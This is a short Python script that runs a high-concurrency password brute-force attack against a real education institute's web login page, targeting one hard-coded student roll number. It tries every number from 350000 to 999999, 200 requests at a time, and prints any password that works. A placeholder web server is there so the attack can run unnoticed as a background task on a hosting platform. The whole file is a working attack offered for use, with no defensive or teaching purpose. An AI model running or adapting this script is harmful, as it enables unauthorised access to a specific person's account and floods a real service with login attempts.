import asyncio
import aiohttp
from aiohttp import web

URL = "https://app.biomeinstitute.in/weblogin/"
ROLL = "25002833"
START = 350000
END = 999999
CONCURRENCY = 200

async def attempt_password(session, password):
    data = {
        "sublogin": "1",
        "username": ROLL,
        "password": str(password),
        "Login": "Secure Login"
    }
    async with session.post(URL, data=data) as response:
        text = await response.text()
        if "Invalid your username and password" not in text:
            print(f"\nSUCCESS! Roll: {ROLL} Password: {password}")
            return True
    return False

async def bruteforce():
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(CONCURRENCY)
        async def bound_attempt(password):
            async with semaphore:
                return await attempt_password(session, password)
        tasks = [bound_attempt(p) for p in range(START, END + 1)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        print("Finished brute force attempts.")

async def handle(request):
    return web.Response(text="Service is running.\n")

app = web.Application()
app.router.add_get("/", handle)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(bruteforce())  # Start brute force as background task
    web.run_app(app, port=10000)  # Bind to port (Render expects this)
